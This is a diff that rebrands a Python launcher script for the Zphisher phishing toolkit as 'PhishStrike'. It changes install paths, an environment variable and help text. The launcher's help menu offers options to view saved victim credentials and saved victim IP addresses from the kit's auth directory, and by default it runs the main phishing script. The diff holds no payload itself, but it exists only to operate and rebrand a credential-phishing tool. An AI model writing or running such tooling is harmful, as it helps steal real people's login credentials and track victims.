@@ -5,10 +5,10 @@ import platform
 import subprocess
 
 if "Android" in platform.system():
-    ZPHISHER_ROOT = "/data/data/com.termux/files/usr/opt/zphisher"
+    PHISHSTRIKE_ROOT = "/data/data/com.termux/files/usr/opt/phishstrike"
 else:
-    ZPHISHER_ROOT = "/opt/zphisher"
-    os.environ["ZPHISHER_ROOT"] = ZPHISHER_ROOT
+    PHISHSTRIKE_ROOT = "/opt/phishstrike"
+    os.environ["PHISHSTRIKE_ROOT"] = PHISHSTRIKE_ROOT
 
 
 def print_file(path):
@@ -23,24 +23,24 @@ def print_file(path):
 if len(sys.argv) > 1:
     arg = sys.argv[1]
     if arg in ["-h", "help"]:
-        print("To run Zphisher type `zphisher` in your cmd\n")
+        print("To run PhishStrike type `phishstrike` in your cmd\n")
         print("Help:")
         print(" -h | help : Print this menu & Exit")
         print(" -c | auth : View Saved Credentials")
         print(" -i | ip   : View Saved Victim IP\n")
     elif arg in ["-c", "auth"]:
-        if not print_file(os.path.join(ZPHISHER_ROOT, "auth", "usernames.dat")):
+        if not print_file(os.path.join(PHISHSTRIKE_ROOT, "auth", "usernames.dat")):
             print("No Credentials Found !")
             sys.exit(1)
     elif arg in ["-i", "ip"]:
-        if not print_file(os.path.join(ZPHISHER_ROOT, "auth", "ip.txt")):
+        if not print_file(os.path.join(PHISHSTRIKE_ROOT, "auth", "ip.txt")):
             print("No Saved IP Found !")
             sys.exit(1)
 else:
     try:
-        os.chdir(ZPHISHER_ROOT)
-        subprocess.run(["python3", "./zphisher.py"])
+        os.chdir(PHISHSTRIKE_ROOT)
+        subprocess.run(["python3", "./phishstrike.py"])
     except FileNotFoundError:
         print(
-            f"Directory {ZPHISHER_ROOT} not found. Zphisher may not be installed correctly."
+            f"Directory {PHISHSTRIKE_ROOT} not found. PhishStrike may not be installed correctly."
         )
